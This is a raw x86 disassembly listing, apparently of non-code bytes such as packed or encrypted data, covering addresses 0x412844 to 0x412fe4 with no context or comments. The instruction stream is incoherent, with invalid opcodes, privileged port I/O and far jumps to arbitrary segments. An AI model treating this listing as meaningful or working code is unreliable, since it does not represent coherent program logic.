  412844:	push   esp
  412845:	jp     0x412874
  412847:	sub    BYTE PTR [ebx+ecx*8-0x38ab476b],al
  41284e:	out    0x52,eax
  412850:	pop    ebx
  412851:	or     al,0xc6
  412853:	mov    esi,0x96053089
  412858:	add    ah,bh
  41285a:	jg     0x4127f7
  41285c:	out    0x2c,al
  41285e:	cmp    dl,ah
  412860:	jns    0x4128a6
  412862:	push   ecx
  412863:	(bad)  
  412864:	ins    DWORD PTR es:[edi],dx
  412865:	cmp    al,0x83
  412867:	and    DWORD PTR [eax],esi
  412869:	leave  
  41286a:	in     al,0xba
  41286c:	fs jge 0x412870
  41286f:	das    
  412870:	push   0xffffff82
  412872:	mov    dh,BYTE PTR [eax-0x32]
  412875:	pop    edx
  412876:	iret   
  412877:	hlt    
  412878:	pop    ss
  412879:	not    DWORD PTR [esi+0x4a8a9f0]
  41287f:	repz adc DWORD PTR [edx+ebp*8-0x53],esi
  412884:	adc    eax,0x356dc669
  412889:	retf   
  41288a:	ror    DWORD PTR [eax-0x6f],cl
  41288d:	cmp    ebx,DWORD PTR [edi-0x5d]
  412890:	cmp    cl,BYTE PTR [esi]
  412892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412893:	fmul   DWORD PTR [edi]
  412895:	sub    bh,BYTE PTR [edx-0x33]
  412898:	jns    0x4128b0
  41289a:	fadd   QWORD PTR [eax-0x61]
  41289d:	sti    
  41289e:	xchg   edx,eax
  41289f:	sbb    ah,BYTE PTR [edx-0x2]
  4128a2:	xchg   ecx,eax
  4128a3:	jl     0x41291d
  4128a5:	popfw  
  4128a7:	xor    edx,eax
  4128a9:	std    
  4128aa:	outs   dx,DWORD PTR ds:[esi]
  4128ab:	pop    ds
  4128ac:	repnz test DWORD PTR [esi],0xe5156b53
  4128b3:	xchg   edx,eax
  4128b4:	loopne 0x412845
  4128b6:	pop    eax
  4128b7:	mov    ch,0x3f
  4128b9:	push   ebp
  4128ba:	ds ss push es
  4128bd:	popa   
  4128be:	in     eax,0xe
  4128c0:	int    0x4a
  4128c2:	pusha  
  4128c3:	or     al,0xac
  4128c5:	xlat   BYTE PTR ds:[ebx]
  4128c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c7:	and    DWORD PTR [edi],ecx
  4128c9:	sti    
  4128ca:	imul   ecx,DWORD PTR [ebx+0x59ab4f9f],0x3ff17f7c
  4128d4:	and    al,0xd6
  4128d6:	inc    eax
  4128d7:	jbe    0x4128c4
  4128d9:	cld    
  4128da:	push   ebx
  4128db:	das    
  4128dc:	push   ds
  4128dd:	pop    DWORD PTR [ebx-0x68]
  4128e0:	or     DWORD PTR [esp+eiz*8-0x29ce3182],eax
  4128e7:	test   eax,0xd2623ebf
  4128ec:	aad    0xa2
  4128ee:	cdq    
  4128ef:	jo     0x412904
  4128f1:	push   ebp
  4128f2:	jae    0x412956
  4128f4:	dec    ecx
  4128f5:	into   
  4128f6:	inc    edi
  4128f7:	fadd   QWORD PTR [esi-0x1d4d73cb]
  4128fd:	jnp    0x4128de
  4128ff:	and    dh,BYTE PTR [eax+0x6c]
  412902:	jl     0x412922
  412904:	jg     0x41292e
  412906:	push   ecx
  412907:	dec    esi
  412908:	repnz lods eax,DWORD PTR ds:[esi]
  41290a:	pusha  
  41290b:	mov    BYTE PTR [ebx+eiz*4+0x62a0d6ec],ch
  412912:	ds neg ebx
  412915:	mov    ecx,0xcc944f2b
  41291a:	popa   
  41291b:	cmp    eax,edi
  41291d:	in     eax,0xe
  41291f:	pop    edx
  412920:	sti    
  412921:	or     bh,BYTE PTR [ecx]
  412923:	lds    esi,FWORD PTR [edx]
  412925:	jmp    0x9a8a75b3
  41292a:	icebp  
  41292b:	push   esp
  41292c:	call   0xca74:0xb8b4
  412932:	dec    ecx
  412933:	inc    eax
  412934:	pop    ds
  412935:	jnp    0x41292b
  412937:	push   ebx
  412938:	fisub  WORD PTR [ecx]
  41293a:	mov    al,ds:0x596c2330
  41293f:	aam    0xc5
  412941:	das    
  412942:	add    esi,DWORD PTR [ebp-0x421e2ea7]
  412948:	and    al,0x3e
  41294a:	and    BYTE PTR [esi],ch
  41294c:	mov    esi,0xf1d67e40
  412951:	stos   BYTE PTR es:[edi],al
  412952:	dec    ebp
  412953:	inc    esp
  412954:	inc    edi
  412955:	add    DWORD PTR [ecx-0x4edecee2],ecx
  41295b:	mov    ch,0x3d
  41295d:	shr    DWORD PTR [ebp-0x33],1
  412960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412961:	jmp    0x3bc33f4f
  412966:	fxch   st(4)
  412968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412969:	push   gs
  41296b:	jnp    0x412924
  41296d:	mov    dh,BYTE PTR [ebx]
  41296f:	cs mov dl,0xe1
  412972:	popf   
  412973:	fcmove st,st(7)
  412975:	pop    es
  412976:	fnstenv [esi+ebx*8]
  412979:	xor    ch,ah
  41297b:	fld    TBYTE PTR [edx]
  41297d:	inc    esp
  41297e:	push   esp
  41297f:	arpl   si,di
  412981:	push   ebx
  412982:	test   al,0x96
  412984:	sub    al,0xda
  412986:	mov    eax,ds:0x585a3c05
  41298b:	ja     0x4129dd
  41298d:	sub    ah,BYTE PTR [eax-0x7f800f1]
  412993:	in     al,dx
  412994:	(bad)  
  412995:	xchg   edi,eax
  412996:	push   edi
  412997:	icebp  
  412998:	mov    ebx,0x4cb748f1
  41299d:	jp     0x4129f0
  41299f:	int3   
  4129a0:	in     al,0x34
  4129a2:	cmp    ecx,edi
  4129a4:	outs   dx,DWORD PTR ds:[esi]
  4129a5:	shl    DWORD PTR [esi+0x7891084b],0xbc
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	push   edi
  4129ae:	jbe    0x412988
  4129b0:	ret    
  4129b1:	aaa    
  4129b2:	jecxz  0x4129cb
  4129b4:	lea    eax,[ecx+0x7396640d]
  4129ba:	mov    bh,BYTE PTR [eax+0xa58a738]
  4129c0:	(bad)  
  4129c2:	leave  
  4129c3:	rol    BYTE PTR [edx-0x7afa01b2],0x54
  4129ca:	lahf   
  4129cb:	outs   dx,DWORD PTR ds:[esi]
  4129cc:	push   0x18d1acbc
  4129d1:	jmp    0x412966
  4129d3:	(bad)  
  4129d5:	cwde   
  4129d6:	pop    esi
  4129d7:	sti    
  4129d8:	jg     0x412a52
  4129da:	mov    esi,0x8de159c8
  4129df:	imul   edi,DWORD PTR [ecx],0x58
  4129e2:	push   edi
  4129e3:	sub    esi,ebx
  4129e5:	pop    edx
  4129e6:	adc    DWORD PTR [eax+0x5507b1a4],esi
  4129ec:	mov    ebx,0xf90757f4
  4129f1:	neg    BYTE PTR ds:0x8a5dd331
  4129f7:	sbb    al,BYTE PTR ds:0xcb741946
  4129fd:	pop    ecx
  4129fe:	sub    BYTE PTR [edx+0x36],ah
  412a01:	in     eax,dx
  412a02:	mov    ch,0xf3
  412a04:	cdq    
  412a05:	pop    ecx
  412a06:	cmp    dl,al
  412a08:	lods   eax,DWORD PTR ds:[esi]
  412a09:	fwait
  412a0a:	ins    BYTE PTR es:[edi],dx
  412a0b:	lods   eax,DWORD PTR ds:[esi]
  412a0c:	int3   
  412a0d:	outs   dx,DWORD PTR ds:[esi]
  412a0e:	jle    0x412a70
  412a10:	jmp    0x412a2d
  412a12:	sbb    eax,DWORD PTR [ecx+0x35542ea0]
  412a18:	clc    
  412a19:	sub    DWORD PTR [ebx-0x75],esi
  412a1c:	dec    esp
  412a1d:	mov    al,ds:0xd0148fa
  412a22:	add    al,0x18
  412a24:	cmp    eax,0x99eecc8d
  412a29:	mov    ah,0x90
  412a2b:	repnz mov ebp,DWORD PTR [edx-0x4]
  412a2f:	idiv   bh
  412a31:	gs and al,0x82
  412a34:	mov    ds,edx
  412a36:	pop    eax
  412a37:	adc    BYTE PTR [edi+0x163d29cf],0x18
  412a3e:	loop   0x412a64
  412a40:	xchg   esi,eax
  412a41:	cld    
  412a42:	sbb    DWORD PTR [esi+0x261e2099],0xd2fc9f6a
  412a4c:	dec    ecx
  412a4d:	inc    esp
  412a4e:	femms  
  412a50:	dec    edi
  412a51:	in     al,dx
  412a52:	aad    0x9a
  412a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a55:	push   0x11757abc
  412a5a:	fidiv  WORD PTR [edx-0x13]
  412a5d:	dec    DWORD PTR [edi+0x26]
  412a60:	or     DWORD PTR [ecx-0x6b6c7ec7],0x3e
  412a67:	daa    
  412a68:	push   ebx
  412a69:	jbe    0x412ade
  412a6b:	jg     0x412a18
  412a6d:	xor    ebx,DWORD PTR [esi+edi*2-0x7fb030d3]
  412a74:	xchg   ebp,eax
  412a75:	lods   eax,DWORD PTR ds:[esi]
  412a76:	ds adc eax,0xa595a211
  412a7c:	xchg   DWORD PTR ds:0x4e9c8b89,edx
  412a82:	shl    BYTE PTR ds:0x5387e026,0xd4
  412a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a8a:	cmp    BYTE PTR [ebx+0x5dbc22f2],ch
  412a90:	jnp    0x412a98
  412a92:	test   BYTE PTR [ebx+ebp*8+0x66],cl
  412a96:	sti    
  412a97:	ret    
  412a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a99:	xchg   edx,eax
  412a9a:	sbb    DWORD PTR [esi+0x767d3014],eax
  412aa0:	ins    DWORD PTR es:[edi],dx
  412aa1:	(bad)  
  412aa2:	sub    al,0x48
  412aa4:	push   cs
  412aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aa6:	mov    ds:0xc1701b6d,eax
  412aab:	cmc    
  412aac:	mov    al,ds:0x56c99889
  412ab1:	or     ah,BYTE PTR [edx]
  412ab3:	ss fcomip st,st(6)
  412ab6:	push   ebp
  412ab7:	adc    al,0x59
  412ab9:	add    eax,0xfe45ff36
  412abe:	rcr    BYTE PTR [edx+0x12a89f8b],cl
  412ac4:	jno    0x412ac1
  412ac6:	sub    al,0xd5
  412ac8:	add    al,0xa8
  412aca:	pusha  
  412acb:	addr16 das 
  412acd:	aas    
  412ace:	mov    ah,0x65
  412ad0:	dec    eax
  412ad1:	push   ebx
  412ad2:	dec    eax
  412ad3:	xchg   ebp,eax
  412ad4:	and    al,0xd9
  412ad6:	sbb    BYTE PTR [eax],bl
  412ad8:	pop    ebp
  412ad9:	mov    bh,0xd8
  412adb:	mov    ecx,0xc753eeeb
  412ae0:	cs int 0xdf
  412ae3:	jle    0x412b4c
  412ae5:	(bad)  
  412ae6:	mov    cs,eax
  412ae8:	sar    dl,1
  412aea:	cli    
  412aeb:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  412aed:	lds    eax,FWORD PTR [edx-0x19]
  412af0:	dec    ebp
  412af1:	xor    eax,0xde0d77f8
  412af6:	cmp    BYTE PTR [ecx+esi*4],ch
  412af9:	jmp    0x412a8c
  412afb:	inc    eax
  412afc:	fdivr  DWORD PTR [edx]
  412afe:	sbb    al,0x8a
  412b00:	gs das 
  412b02:	outs   dx,BYTE PTR ds:[esi]
  412b03:	ficomp DWORD PTR [edi+edi*1]
  412b06:	call   0xb03d3f8
  412b0b:	cmp    ah,ch
  412b0d:	sbb    eax,0x8851804
  412b12:	(bad)  
  412b13:	sti    
  412b14:	enter  0x681f,0xe
  412b18:	cmp    bh,BYTE PTR [esi]
  412b1a:	pop    ebx
  412b1b:	mov    ah,0x32
  412b1d:	push   ebx
  412b1e:	mov    ds:0x691635c2,eax
  412b23:	jns    0x412b73
  412b25:	jecxz  0x412abb
  412b27:	mov    si,0x67
  412b2b:	je     0x412b9c
  412b2d:	add    edx,DWORD PTR ss:[esp+edx*1-0xb]
  412b32:	test   BYTE PTR [ebp+0x52],0x50
  412b36:	push   edx
  412b37:	ins    DWORD PTR es:[edi],dx
  412b38:	xchg   esi,eax
  412b39:	fsqrt  
  412b3b:	popa   
  412b3c:	imul   ebx,DWORD PTR [ebx],0x1e81300d
  412b42:	fdivr  DWORD PTR [ebp-0x3c884ddb]
  412b48:	aam    0xa6
  412b4a:	and    ah,BYTE PTR [ecx]
  412b4c:	push   ss
  412b4d:	adc    BYTE PTR [edi-0x49],bh
  412b50:	scas   al,BYTE PTR es:[edi]
  412b51:	jg     0x412b61
  412b53:	mov    ah,0xd4
  412b55:	cdq    
  412b56:	lahf   
  412b57:	and    ecx,DWORD PTR [eax]
  412b59:	icebp  
  412b5a:	mov    ebp,0x57a5b710
  412b5f:	mov    edi,DWORD PTR [ebp-0x16af6cb9]
  412b65:	sbb    edi,DWORD PTR [ecx+0x58]
  412b68:	sub    al,0x4c
  412b6a:	cdq    
  412b6b:	mov    dl,0x6d
  412b6d:	xchg   ecx,eax
  412b6e:	cmp    eax,0x8d6f988c
  412b73:	jne    0x412bce
  412b75:	push   0xffffffdc
  412b77:	leave  
  412b78:	test   DWORD PTR [ebp-0x5e242461],ebp
  412b7e:	lds    edi,FWORD PTR [ebp+0x7e]
  412b81:	jo     0x412bbf
  412b83:	jno    0x412b7e
  412b85:	xor    esi,edi
  412b87:	inc    esi
  412b88:	jmp    0x5470:0xd1af7706
  412b8f:	and    eax,0x69e22c33
  412b94:	mov    al,0x42
  412b96:	jae    0x412b40
  412b98:	xor    edi,DWORD PTR [ebp+0x6101392f]
  412b9e:	cmp    eax,0x7ac916e3
  412ba3:	in     al,dx
  412ba4:	jmp    0xc8ab:0xd5c50140
  412bab:	dec    ebx
  412bac:	adc    BYTE PTR [ecx+0x6d68bef4],ah
  412bb2:	jecxz  0x412b3a
  412bb4:	fdivr  st(7),st
  412bb6:	pop    eax
  412bb7:	repnz or DWORD PTR [ebp-0x46],ecx
  412bbb:	mov    cl,0x9f
  412bbd:	mov    ah,0x24
  412bbf:	pusha  
  412bc0:	enter  0x248d,0x5b
  412bc4:	mov    WORD PTR [ebp+0x6],?
  412bc7:	mov    ds:0xcb64f7eb,eax
  412bcc:	stc    
  412bcd:	pusha  
  412bce:	mov    dl,0x43
  412bd0:	pop    esp
  412bd1:	and    esi,DWORD PTR [eax]
  412bd3:	call   FWORD PTR [ebp-0x2634a1af]
  412bd9:	stc    
  412bda:	ffreep st(6)
  412bdc:	mov    al,ds:0x5ff11875
  412be1:	das    
  412be2:	fadd   st(5),st
  412be4:	test   ch,0x5b
  412be7:	mov    edi,0xaa61b97b
  412bec:	pop    edi
  412bed:	push   cs
  412bee:	and    DWORD PTR [edi],eax
  412bf0:	pop    edx
  412bf1:	jp     0x412c4c
  412bf3:	daa    
  412bf4:	lds    esi,FWORD PTR [eax-0x6e70c2d3]
  412bfa:	test   edx,ebx
  412bfc:	mov    cl,0x82
  412bfe:	cmp    eax,0x346cc8d2
  412c03:	push   esp
  412c04:	xchg   edi,eax
  412c05:	les    edx,FWORD PTR [eax+eax*8-0x5f051d1c]
  412c0c:	mov    al,ds:0x44aceb92
  412c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c12:	retf   
  412c13:	out    dx,eax
  412c14:	fidivr WORD PTR [edi]
  412c16:	mov    bl,0x57
  412c18:	xchg   BYTE PTR [ebx+0x6f],cl
  412c1b:	loope  0x412c93
  412c1d:	inc    esi
  412c1e:	loopne 0x412c7c
  412c20:	ja     0x412c49
  412c22:	or     DWORD PTR ds:0xc2469e5,esi
  412c28:	mov    eax,DWORD PTR [esi-0x64]
  412c2b:	hlt    
  412c2c:	aaa    
  412c2d:	jl     0x412cac
  412c2f:	fidivr WORD PTR [esi]
  412c31:	add    eax,0x8d5afa00
  412c36:	cwde   
  412c37:	leave  
  412c38:	xchg   esi,eax
  412c39:	cs cmp al,0x3
  412c3c:	mov    ebp,0x377f6edf
  412c41:	lods   eax,DWORD PTR ds:[esi]
  412c42:	stos   BYTE PTR es:[edi],al
  412c43:	cli    
  412c44:	rcl    DWORD PTR [edx],1
  412c46:	dec    eax
  412c47:	xchg   edx,eax
  412c48:	jle    0x412cc1
  412c4a:	dec    eax
  412c4b:	xchg   esp,eax
  412c4c:	or     DWORD PTR [eax+eiz*1],ebx
  412c4f:	mov    ebp,0x85fe364a
  412c54:	mov    ecx,DWORD PTR es:[ebx]
  412c57:	aam    0x67
  412c59:	enter  0x8e72,0x2b
  412c5d:	xchg   DWORD PTR [ebx+0x6d],edi
  412c60:	dec    ecx
  412c61:	enter  0x245c,0xbe
  412c65:	cmp    dl,ah
  412c67:	jmp    0xaa55:0xb5cf595d
  412c6e:	mov    dh,0x41
  412c70:	inc    eax
  412c71:	in     eax,dx
  412c72:	nop
  412c73:	sbb    DWORD PTR [ecx],0xff788dbf
  412c79:	mov    ebx,0x89f46acc
  412c7e:	sahf   
  412c7f:	jb     0x412c49
  412c81:	mov    dl,0xae
  412c83:	jecxz  0x412cf8
  412c85:	pop    esi
  412c86:	pop    esi
  412c87:	daa    
  412c88:	aaa    
  412c89:	adc    al,0x6f
  412c8b:	dec    ebx
  412c8c:	fidivr WORD PTR [esi+edx*2+0x4bf181ad]
  412c93:	add    bh,cl
  412c95:	fs cmp al,0xbe
  412c98:	jnp    0x412cf9
  412c9a:	scas   al,BYTE PTR es:[edi]
  412c9b:	cmp    bh,bl
  412c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9e:	jg     0x412c74
  412ca0:	stos   BYTE PTR es:[edi],al
  412ca1:	scas   al,BYTE PTR es:[edi]
  412ca2:	xchg   esp,eax
  412ca3:	rcr    DWORD PTR [eax],1
  412ca5:	lock cmc 
  412ca7:	std    
  412ca8:	sti    
  412ca9:	lods   eax,DWORD PTR ds:[esi]
  412caa:	les    esp,FWORD PTR [esi+ecx*1]
  412cad:	(bad)  
  412cae:	cli    
  412caf:	jg     0x412cda
  412cb1:	sahf   
  412cb2:	jmp    0x14330ad4
  412cb7:	inc    ecx
  412cb8:	fucomp st(6)
  412cba:	cmp    dh,ch
  412cbc:	shl    dh,0xa7
  412cbf:	pop    eax
  412cc0:	(bad)  
  412cc1:	jbe    0x412cf4
  412cc3:	pop    eax
  412cc4:	mov    esi,0xd51c7d71
  412cc9:	cmp    eax,0x20f21354
  412cce:	mov    ch,0x8b
  412cd0:	fdivp  st(6),st
  412cd2:	retf   
  412cd3:	clc    
  412cd4:	xor    al,BYTE PTR [edx-0xcc6d2c6]
  412cda:	pop    edi
  412cdb:	mov    dl,0x1e
  412cdd:	sbb    eax,DWORD PTR [ecx+0x1a40f6c7]
  412ce3:	stos   DWORD PTR es:[edi],eax
  412ce4:	push   esi
  412ce5:	sub    BYTE PTR [ecx+0x4e],0xe
  412ce9:	cdq    
  412cea:	jb     0x412cf1
  412cec:	daa    
  412ced:	push   esi
  412cee:	aad    0x3f
  412cf0:	adc    al,0xad
  412cf2:	mov    ebp,0x4227f098
  412cf7:	lods   al,BYTE PTR ds:[esi]
  412cf8:	xchg   ebp,eax
  412cf9:	push   esp
  412cfa:	sahf   
  412cfb:	fisubr WORD PTR [ebx+0xc]
  412cfe:	jo     0x412d62
  412d00:	int    0xfe
  412d02:	adc    DWORD PTR [esp+edx*4+0x28],0xf9fc875
  412d0a:	jl     0x412cd7
  412d0c:	test   DWORD PTR [ecx+0x66],edi
  412d0f:	or     BYTE PTR [ebp+esi*1+0x20bd3369],al
  412d16:	adc    DWORD PTR [edx-0x224e2eea],0xd
  412d1d:	mov    dl,0x1
  412d1f:	mov    ecx,0x92561813
  412d24:	popf   
  412d25:	mov    al,0x58
  412d27:	sub    edi,DWORD PTR [edi+ecx*2+0x36]
  412d2b:	mov    ah,0x13
  412d2d:	mov    ds:0xf19f675e,eax
  412d32:	push   edi
  412d33:	mov    eax,ds:0x1ec17ad1
  412d38:	repnz xchg esp,eax
  412d3b:	push   0x4e
  412d3d:	dec    esi
  412d3e:	mul    ah
  412d40:	inc    ecx
  412d41:	lea    edx,[ebp+0x46154e77]
  412d47:	mov    esp,0xafb9a7ca
  412d4c:	lods   al,BYTE PTR ds:[esi]
  412d4d:	sbb    ah,al
  412d4f:	dec    edi
  412d50:	ret    
  412d51:	in     eax,dx
  412d52:	mov    ah,0x4d
  412d54:	sub    al,0x31
  412d56:	inc    edi
  412d57:	mov    edx,0xf04cdceb
  412d5c:	jle    0x412d77
  412d5e:	dec    ebx
  412d5f:	aam    0x17
  412d61:	jbe    0x412d27
  412d63:	dec    ebp
  412d64:	cmp    esi,edx
  412d66:	mov    ecx,0xdb02c4eb
  412d6b:	stos   BYTE PTR es:[edi],al
  412d6c:	add    dl,0x3
  412d6f:	adc    al,BYTE PTR [edx-0x781c9487]
  412d75:	not    DWORD PTR [edi-0x6312ae8d]
  412d7b:	fs cli 
  412d7d:	mov    ds:0x1fa394c2,eax
  412d82:	or     al,0x94
  412d84:	xchg   esi,eax
  412d85:	mov    ds:0x98e7167e,eax
  412d8a:	inc    ecx
  412d8b:	or     al,0xec
  412d8d:	mov    ah,BYTE PTR [ebp+0x477a9c69]
  412d93:	repnz shl BYTE PTR [edx+0x3c],0x9
  412d98:	xlat   BYTE PTR ds:[ebx]
  412d99:	pop    ecx
  412d9a:	sub    BYTE PTR [edx+0xa],0x4c
  412d9e:	mov    cl,bl
  412da0:	(bad)  
  412da1:	mov    eax,0xf2b57460
  412da6:	adc    dh,0x9a
  412da9:	inc    ebp
  412daa:	push   bp
  412dac:	loope  0x412d44
  412dae:	and    al,0x3e
  412db0:	sbb    al,0x57
  412db2:	cs jne 0x412e27
  412db5:	neg    BYTE PTR [ebx-0x68]
  412db8:	add    BYTE PTR [ebx-0x5ccc4232],ch
  412dbe:	aam    0x7a
  412dc0:	and    al,0xee
  412dc2:	cmp    eax,0x5d135d03
  412dc7:	dec    eax
  412dc8:	ss inc esi
  412dca:	fldenv [ebx-0x76]
  412dcd:	mov    BYTE PTR [edi+0x3dcec8f2],cl
  412dd3:	and    DWORD PTR [ecx+edi*8],ebp
  412dd6:	ss mov edx,0x6a46efcb
  412ddc:	jb     0x412e31
  412dde:	(bad)  
  412ddf:	mov    ebx,0x9c9615ac
  412de4:	call   0x7d96:0xd3756180
  412deb:	or     BYTE PTR [edi+0x5],cl
  412dee:	or     bh,ch
  412df0:	mov    ebx,0xecf0fe70
  412df5:	out    0x9d,ax
  412df8:	iret   
  412df9:	call   0x38558dc3
  412dfe:	push   eax
  412dff:	aam    0x26
  412e01:	sahf   
  412e02:	data16 and al,0x92
  412e05:	sub    eax,0x391c2d4f
  412e0a:	bnd addr16 jge 0x412e7e
  412e0e:	mov    dh,0x27
  412e10:	es pop ebp
  412e12:	cmc    
  412e13:	inc    eax
  412e14:	jns    0x412e69
  412e16:	and    DWORD PTR [edx+0x70d50ddb],esp
  412e1c:	xchg   edx,eax
  412e1e:	and    al,0x32
  412e20:	lds    edx,FWORD PTR cs:[ebp-0x3cc980c0]
  412e27:	push   esi
  412e28:	sub    dh,bh
  412e2a:	mov    al,ds:0xed442193
  412e2f:	fstp   TBYTE PTR [edx+0x54]
  412e32:	mov    ds:0x3bd3be66,al
  412e37:	mov    ds:0x9342b4ea,eax
  412e3c:	or     eax,0x605a8476
  412e41:	push   edx
  412e42:	pop    es
  412e43:	int3   
  412e44:	inc    DWORD PTR [eax]
  412e46:	mov    eax,ds:0xb041e9f8
  412e4b:	test   ax,0x4ed0
  412e4f:	jbe    0x412e00
  412e51:	je     0x412e87
  412e53:	test   DWORD PTR [ebp-0x2f],esp
  412e56:	dec    ebp
  412e57:	out    0x5b,eax
  412e59:	pushf  
  412e5a:	fsubr  QWORD PTR [ecx]
  412e5c:	shr    DWORD PTR [ecx+0x32],cl
  412e5f:	push   esi
  412e60:	(bad)  
  412e61:	cmp    ebx,DWORD PTR [ebx+0x12f75a45]
  412e67:	popf   
  412e68:	inc    DWORD PTR [eax+0x3a]
  412e6b:	retf   
  412e6c:	out    dx,eax
  412e6d:	mov    al,ds:0x11fab159
  412e72:	lahf   
  412e73:	sbb    ebx,ebp
  412e75:	mov    bh,0x1d
  412e77:	xor    esi,DWORD PTR [esi+ebp*1-0x3749116e]
  412e7e:	mov    DWORD PTR [esi],esp
  412e80:	iret   
  412e81:	push   ds
  412e82:	and    eax,0x54c0e25e
  412e87:	popf   
  412e88:	jge    0x412eac
  412e8a:	mov    dh,0xa7
  412e8c:	(bad)  
  412e8d:	ficomp WORD PTR ds:0x1d60a9be
  412e93:	pop    es
  412e94:	or     ch,BYTE PTR [esi]
  412e96:	jmp    DWORD PTR [ebx]
  412e98:	fldcw  WORD PTR [esi+ebx*4-0x29]
  412e9c:	(bad)  
  412e9d:	cmp    al,0x46
  412e9f:	les    ebp,FWORD PTR [esi]
  412ea1:	pusha  
  412ea2:	retf   
  412ea3:	pop    ebx
  412ea4:	int3   
  412ea5:	dec    eax
  412ea6:	(bad)  
  412ea7:	jb     0x412e2b
  412ea9:	xchg   esi,eax
  412eaa:	push   ebp
  412eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eac:	xor    esp,DWORD PTR [edi]
  412eae:	int    0x8b
  412eb0:	stos   DWORD PTR es:[edi],eax
  412eb1:	daa    
  412eb2:	iret   
  412eb3:	(bad)  
  412eb4:	adc    cl,ah
  412eb6:	ins    BYTE PTR es:[edi],dx
  412eb7:	mov    al,ds:0x12e431d9
  412ebc:	ja     0x412e83
  412ebe:	cmp    eax,0x19b252a4
  412ec3:	cdq    
  412ec4:	rcr    WORD PTR [ecx-0x67c3f109],0x72
  412ecc:	jns    0x412e60
  412ece:	dec    eax
  412ecf:	out    dx,al
  412ed0:	cmp    eax,0xfecdf202
  412ed5:	scas   eax,DWORD PTR es:[edi]
  412ed6:	push   ds
  412ed7:	jmp    0xb776:0x2088015
  412ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412edf:	jp     0x412e8b
  412ee1:	dec    ebx
  412ee2:	dec    esi
  412ee3:	adc    bl,ch
  412ee5:	mov    ds:0xd9736d6b,al
  412eea:	popf   
  412eeb:	pusha  
  412eec:	js     0x412f05
  412eee:	jne    0x412eca
  412ef0:	cwde   
  412ef1:	mov    DWORD PTR [edi+0x776f8a1e],ebx
  412ef7:	push   cs
  412ef8:	jns    0x412ec3
  412efa:	call   0xbbb6c7fa
  412eff:	dec    ecx
  412f00:	mov    ah,0xe0
  412f02:	in     eax,dx
  412f03:	out    0x4a,eax
  412f05:	lods   eax,DWORD PTR ds:[esi]
  412f06:	into   
  412f07:	inc    ebp
  412f08:	ins    BYTE PTR es:[edi],dx
  412f09:	(bad)  
  412f0a:	and    cl,BYTE PTR [ecx]
  412f0c:	ins    DWORD PTR es:[edi],dx
  412f0d:	shl    DWORD PTR [eax+0x18],1
  412f10:	push   edi
  412f11:	inc    edx
  412f12:	mov    gs,WORD PTR [edi]
  412f14:	inc    ecx
  412f15:	sbb    eax,DWORD PTR [ecx]
  412f17:	test   al,0x70
  412f19:	retf   0x2271
  412f1c:	not    ah
  412f1e:	repnz stc 
  412f20:	loopne 0x412fa0
  412f22:	mov    esi,0xe77fdb23
  412f27:	jecxz  0x412eb6
  412f29:	push   ecx
  412f2a:	rcr    DWORD PTR [edx],1
  412f2c:	mov    WORD PTR [ecx-0x42],ss
  412f2f:	and    eax,0x20714421
  412f34:	rcr    BYTE PTR [esi-0x2],0x22
  412f38:	data16 cmp bh,cl
  412f3b:	jae    0x412fb3
  412f3d:	xchg   ebp,eax
  412f3e:	mov    cl,0x17
  412f40:	xchg   esp,eax
  412f41:	mov    ebx,DWORD PTR [esp+ebx*2+0x7]
  412f45:	or     al,0x71
  412f47:	jmp    0x412f61
  412f49:	push   0x84a4cfdd
  412f4e:	sti    
  412f4f:	nop
  412f50:	cmovb  ebp,DWORD PTR [ecx+eiz*8-0x77e3ee70]
  412f58:	pop    DWORD PTR [eax-0x57]
  412f5b:	scas   al,BYTE PTR es:[edi]
  412f5c:	dec    ecx
  412f5d:	dec    ebx
  412f5e:	inc    ebp
  412f5f:	inc    ebx
  412f60:	stos   DWORD PTR es:[edi],eax
  412f61:	add    cl,BYTE PTR [ebp+0x546d8cd]
  412f67:	sub    ecx,eax
  412f69:	mov    ds:0x91efebd4,eax
  412f6e:	xor    BYTE PTR [edi+ebp*8+0x2b],al
  412f72:	imul   edx,DWORD PTR [ebx+0x26],0x975d02e3
  412f79:	mov    ah,0xe7
  412f7b:	and    ah,bl
  412f7d:	out    0xb5,al
  412f7f:	mov    sp,0x7203
  412f83:	fiadd  WORD PTR [ecx]
  412f85:	mov    dl,0x5d
  412f87:	lock fdiv DWORD PTR [edx+0x4a]
  412f8b:	sbb    eax,0xa510944d
  412f90:	scas   al,BYTE PTR es:[edi]
  412f91:	sbb    eax,0x7bbefd07
  412f96:	call   0xf0b6517a
  412f9b:	and    BYTE PTR [ebx+0x17d83b2d],al
  412fa1:	push   esp
  412fa2:	adc    edx,DWORD PTR [ecx]
  412fa4:	inc    edi
  412fa5:	jl     0x412f77
  412fa7:	mov    bl,al
  412fa9:	mov    BYTE PTR [eax+ecx*8+0x58],dl
  412fad:	push   ecx
  412fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412faf:	cmp    esp,DWORD PTR [ebx-0x46030f33]
  412fb5:	xor    al,0x12
  412fb7:	cmp    eax,0x118bb833
  412fbc:	inc    edi
  412fbd:	push   ecx
  412fbe:	mov    ebp,0xb062392
  412fc3:	jno    0x413010
  412fc5:	test   esi,edx
  412fc7:	adc    eax,0x6e5f1ce6
  412fcc:	fxam   
  412fce:	(bad)  
  412fcf:	push   cs
  412fd0:	mov    bh,0x56
  412fd2:	(bad)
  412fd7:	xor    dh,BYTE PTR [ecx]
  412fd9:	push   es
  412fda:	mov    DWORD PTR [edi-0x80],ebx
  412fdd:	cwde   
  412fde:	lahf   
  412fdf:	mov    ecx,0xf470d758
  412fe4:	mov    BYTE PTR ds:0x2923ce59,ch
